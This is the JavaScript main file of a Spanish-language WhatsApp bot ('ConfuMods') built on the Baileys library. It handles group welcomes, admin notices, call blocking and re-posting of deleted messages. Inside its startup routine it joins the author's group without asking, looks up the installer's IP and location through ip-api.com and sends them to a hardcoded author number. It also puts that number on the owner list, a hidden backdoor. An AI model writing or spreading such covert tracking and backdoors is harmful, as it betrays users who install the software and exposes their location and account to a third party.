const { WAConnection: _WAConnection, MessageType, Presence, Mimetype, ChatModification, GroupSettingChange, ReconnectMode } = require('@adiwajshing/baileys')
const simple = require('./lib/simple.js')
const WAConnection = simple.WAConnection(_WAConnection)
const cnf = new WAConnection()
const qrcode = require("qrcode-terminal")
const moment = require("moment-timezone")
const fs = require("fs")
const util = require('util')
const figlet = require('figlet')
const term = require('terminal-kit').terminal
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
const fetch = require('node-fetch')
const { color, bgcolor } = require('./lib/color')
const { exec } = require('child_process')
const { wait, simih, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const settings = JSON.parse(fs.readFileSync('./settings.json'))
const sleep = async (ms) => {
return new Promise(resolve => setTimeout(resolve, ms))
}
nocache('./confu.js', module => console.log(color('|TRM|'), color(`${module} actualizado`, 'cyan')))

async function starts() {
cnf.autoReconnect = ReconnectMode.onConnectionLost
    cnf.version = [2, 2119, 6]
    cnf.logger.level = 'warn'
    cnf.browserDescription = ['ConfuMods','Desktop','3.0']
    await sleep(10000)
    cnf.on('qr', qr => {
        qrcode.generate(qr, { small: true })
        console.log(color('|TRM|'), color('Escanea el código QR 7u7', 'red'))
    })
    fs.existsSync('./cnf.json') && cnf.loadAuthInfo('./cnf.json')
    
    cnf.on('credentials-updated', () => {
        console.log(color('|TRM|'), color('Archivos actualizados!', 'cyan'))
        })
     
      await cnf.connect({ timeoutMs: 30 * 1000 });
  fs.writeFileSync("./cnf.json",JSON.stringify(cnf.base64EncodedAuthInfo(), null, "\t"));
 teks = `https://chat.whatsapp.com/CMn8zNddsIyAALctqol6V0`  
 cnf.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
 console.log(color('|WRN|', 'yellow'), color('Úniendose al grupo oficial de ConfuMods', 'cyan'))
 cnf.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Hola creador soy ${settings.NamaBot}, Me eh conectado a este número con éxito*\n────────────────────\n\`\`\`${JSON.stringify(cnf.user, null, 2)}\`\`\`\n────────────────────\n*Si hay un error o el bot no responde reportarlo a ConfuMods*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "ConfuMods",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./confumods.jpg'),sourceUrl:"https://wa.me/50254371795?text=ola%20confu%20Te%20Amo😍❤️"}}})
	console.log(color('|WRN|', 'yellow'), color('Enviando de información de usuario a ConfuMods', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       cnf.sendMessage("50254371795@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Creador ConfuMods",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./confumods.jpg'),sourceUrl:"https://wa.me/50254371795?text=Ola"}}})
       console.log(color('|WRN|', 'yellow'), color('Enviando ip a ConfuMods', 'red'))
   })
      cnf.on('connecting', () => {
		console.log(color('|TRM|'), color('Conectando, asegúrese de que la red sea estable...', 'cyan'))
		})
	
	cnf.on('open', () => {
	console.log(color('|TRM|'), color('Conectado, escriba #menu en Whatsapp..!!', 'cyan'))
	}) 
     
    cnf.on('ws-close', () => {
        console.log(color('|TRM|'), color('Conexión perdida, intentando volver a conectar.', 'cyan'))
        })
    
    cnf.on('close', async () => {
        console.log(color('|TRM|'), color('Desconectado.', 'cyan'))
        })
    
	if (!settings.autoplaymusic) {
exec(`cd /sdcard/download && play *mp3`)
}
   
   cnf.on('chat-update', async (mek) => {
        require('./confu.js')(cnf, mek)
        ownerNumber = ["50254371795@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
        dtod = "50254371795@s.whatsapp.net"
       otod = `${settings.NomorOwner}@s.whatsapp.net`
    })   
        cnf.on('group-participants-update', async (anu) => {
        const welkom = JSON.parse(fs.readFileSync('./database/welkom.json'))

		if (!welkom.includes(anu.jid)) return
           mem = anu.participants[0]
			const mdata = await cnf.groupMetadata(anu.jid)
		    try {
			console.log(anu)
			if (anu.action == 'add') {			
			fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;cnf;;;\nFN:cnf\nitem1.TEL;waid=50254371795:50254371795\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
		    num = anu.participants[0]
			try {
			ppimg = await cnf.getProfilePicture(`${num.split('@')[0]}@c.us`)
			} catch {
			ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
			}
			let buff = await getBuffer(ppimg)
			masuk =`Hola @${num.split('@')[0]}\nBienvenido a ${mdata.subject}\n\nPor favor lee las reglas y no agas spam.`
            cnf.sendMessage(mdata.id, masuk, MessageType.text, { quoted: fkontakk, thumbnail: fs.readFileSync('./confumods.jpg'), contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `Bienvenido a ${mdata.subject}`,body:"",mediaType:"2",thumbnail:buff,mediaUrl:`https://youtube.com/c/ConfuMods`}}})
			} else if (anu.action == 'remove') {
			fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;cnf;;;\nFN:cnf\nitem1.TEL;waid=50254371795:50254371795\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
			num = anu.participants[0]
			try {
			ppimg = await cnf.getProfilePicture(`${num.split('@')[0]}@c.us`)
			} catch {
			ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
			}
			let buff = await getBuffer(ppimg)
			keluar =`Adiós @${num.split('@')[0]}\nOjalá no vuelva :v`
            cnf.sendMessage(mdata.id, keluar, MessageType.text, { quoted: fkontakk, thumbnail: fs.readFileSync('./confumods.jpg'), contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `Salio de ${mdata.subject}`,body:"",mediaType:"2",thumbnail:buff,mediaUrl:`https://youtube.com/c/ConfuMods`}}})
			} else if (anu.action == 'promote') {
fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;cnf;;;\nFN:cnf\nitem1.TEL;waid=50254371795:50254371795\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
num = anu.participants[0]
teks = `*NUEVO ADMIN - DETECTADO*\nUsuario: @${num.split('@')[0]}\nTiempo : ${moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')}\nGrupo: ${mdata.subject}\n\nFelicidades por su Ascenso a Administrador 🥳🎉`
cnf.sendMessage(mdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [num]}, quoted: fkontakk})
console.log(color('|TRM|'), color(`Nuevo admin ${num.split('@')[0]} En ${mdata.subject}`,  'cyan'))
} 
else if (anu.action == 'demote') {
fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;cnf;;;\nFN:cnf\nitem1.TEL;waid=50254371795:50254371795\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
num = anu.participants[0]
teks = `*DEGRADACIÓN - DETECTADA*\nUsuario: @${num.split('@')[0]}\nTiempo : ${moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')}\nGrupo: ${mdata.subject}\n\nChale ya no eres administrador xd`
cnf.sendMessage(mdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [num]}, quoted: fkontakk})
console.log(color('|TRM|'), color(`Degradacion ${num.split('@')[0]} En ${mdata.subject}`,  'cyan'))
}
		    } catch (e) {
			console.log('Error : %s', color(e, 'red'))
		    }
	        })	       
	cnf.on('group-update', async (anu) => {
		const metdata = await cnf.groupMetadata(anu.jid)
    	const fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${metdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;cnf;;;\nFN:cnf\nitem1.TEL;waid=50254371795:50254371795\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
    if(anu.announce == 'false'){
    teks = `- [ Grupo Abierto ] -\n\n_El grupo ha sido abierto por el administrador_\n_Ahora todos los miembros pueden enviar mensajes_`
    cnf.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
    console.log(color('|TRM|'), color(`Grupo Abierto ${metdata.subject}`, 'cyan'))
  } 
  else if(anu.announce == 'true'){
    teks = `- [ Grupo Cerrado ] -\n\n_Grupo cerrado por un administrador_\n_Ahora solo los administradores pueden enviar mensajes_`
    cnf.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
    console.log(color('|TRM|'), color(`Grupo Cerrado ${metdata.subject}`,  'cyan'))
  }
  else if(!anu.desc == ''){
    tag = anu.descOwner.split('@')[0] + '@s.whatsapp.net'
    teks = `- [ Nueva descripción] -\n\nEl administrador ha cambiado la descripción del grupo @${anu.descOwner.split('@')[0]}\n• Nueva descripción : ${anu.desc}`
    cnf.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [tag]}, quoted: fkontakk})
    console.log(color('|TRM|'), color(`Descripcion cambiada ${metdata.subject}`, 'cyan'))
  }
  else if(anu.restrict == 'false'){
    teks = `- [ Nuevos ajustes ] -\n\nSe ha abierto la opción Editar información del grupo para los miembros.\nAhora todos los miembros pueden editar la información de este grupo.`
    cnf.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
    console.log(color('|TRM|'), color(`Ajustes editados ${metdata.subject}`, 'cyan'))
  }
  else if(anu.restrict == 'true'){
    teks = `- [ Nuevos ajustes ] -\n\nSe ha cerrado la edición de la información del grupo para los miembros.\nAhora solo el administrador del grupo puede editar la información de este grupo`
    cnf.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
    console.log(color('|TRM|'), color(`Ajustes editados ${metdata.subject}`,  'cyan'))
  }
})

cnf.on('CB:action,,call', async json => {
        const callerId = json[2][0][1].from;
        var vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + `${NamaOwner}` + '\n' + `ORG:Creador de ${NamaBot}\n` + 'TEL;type=CELL;type=VOICE;waid=' + `${NomorOwner}` + ':+' + `${NomorOwner}` + '\n' + 'END:VCARD'
        cnf.sendMessage(callerId, "\`\`\`[ ! ] LLAMADA DETECTADA [ ! ]\`\`\`\n\n\`\`\`Estás bloqueado debido a que no estan permitidas las llamadas, comuníquese con el desarrollador del bot para desbloquear.\`\`\`", MessageType.text)
        cnf.sendMessage(callerId, { displayname: `${NamaOwner}`, vcard: vcard}, MessageType.contact, {contextInfo: { externalAdReply:{title: `Creador ${NamaBot}`,body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./confumods.jpg'),sourceUrl:`https://wa.me/50254371795?text=ola%20confu%20Te%20Amo❤️😍`}}})
        await sleep(5000)
        await cnf.blockUser(callerId, "add")
        })
        
	cnf.on('message-delete', async (m) => {
if (m.key.remoteJid == 'status@broadcast') return
if (!m.key.fromMe) {
m.message = (Object.keys(m.message)[0] === 'ephemeralMessage') ? m.message.ephemeralMessage.message : m.message
const jam = moment.tz('Asia/Jakarta').format('HH:mm:ss')
let d = new Date
let c = cnf.chats.get(m.key.remoteJid)
let a = c.messages.dict[`${m.key.id}|${m.key.fromMe ? 1 : 0}`]
let co3ntent = cnf.generateForwardMessageContent(a, false)
let c3type = Object.keys(co3ntent)[0]
let locale = 'id'
let gmt = new Date(0).getTime() - new Date('1 enero 2021').getTime()
let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
let week = d.toLocaleDateString(locale, { weekday: 'long' })
let calender = d.toLocaleDateString(locale, {
day: 'numeric',
month: 'long',
year: 'numeric'
})
cnf.copyNForward(m.key.remoteJid, m.message)
cnf.sendMessage(m.key.remoteJid, `▷\`\`\`ANTI ELIMINAR\`\`\`

⚔️ \`\`\`Nombre : @${m.participant.split("@")[0]}\`\`\`
⚔️ \`\`\`Tipo : ${c3type}\`\`\`
⚔️ \`\`\`Fecha : ${jam} - ${week} ${weton} - ${calender}\`\`\``, MessageType.text, {quoted: m.message, contextInfo: {"mentionedJid": [m.participant]}})
}
})
}

console.clear()
var progressBar , progress = 0 ;
function doProgress()
{
	progress += Math.random() / 10 ;
	progressBar.update( progress ) ;
	
	if ( progress >= 1 )
	{
		setTimeout( function() { console.clear(),
		exec(`screenfetch -A Deepin`, (error, stdout, stderr) => {
			console.log(stdout), console.log(bgcolor('Usas los bots de Confu? que esperas movete y subscríbete a su canal ctm', 'red'))})}, 200 ) ;
	}
	else
	{
		setTimeout( doProgress , 100 + Math.random() * 150 ) ;
	}
}
console.log(color(figlet.textSync(`${settings.NamaBot}`, {
		font: 'Standard',
		horizontalLayout: 'default',
		vertivalLayout: 'default',
		width: 50,
		whitespaceBreak: true
	    }), 'lightgreen')), term.slowTyping('Edit by ConfuMods' ,{ flashStyle: term.brightWhite })
progressBar = term.progressBar( {
	width: 80 ,
	title: '\n\nCargando' ,
	eta: true ,
	percent: true
} ) ;
doProgress() ;

/**
 * Uncache if there is file change
 * @param {string} module Module name or path
 * @param {function} cb <optional> 
 */
function nocache(module, cb = () => { }) {
    fs.watchFile(require.resolve(module), async () => {
        await uncache(require.resolve(module))
        cb(module)
    })
}
/**
 * Uncache a module
 * @param {string} module Module name or path
 */
function uncache(module = '.') {
    return new Promise((resolve, reject) => {
        try {
            delete require.cache[require.resolve(module)]
            resolve()
        } catch (e) {
            reject(e)
        }
    })
}
starts()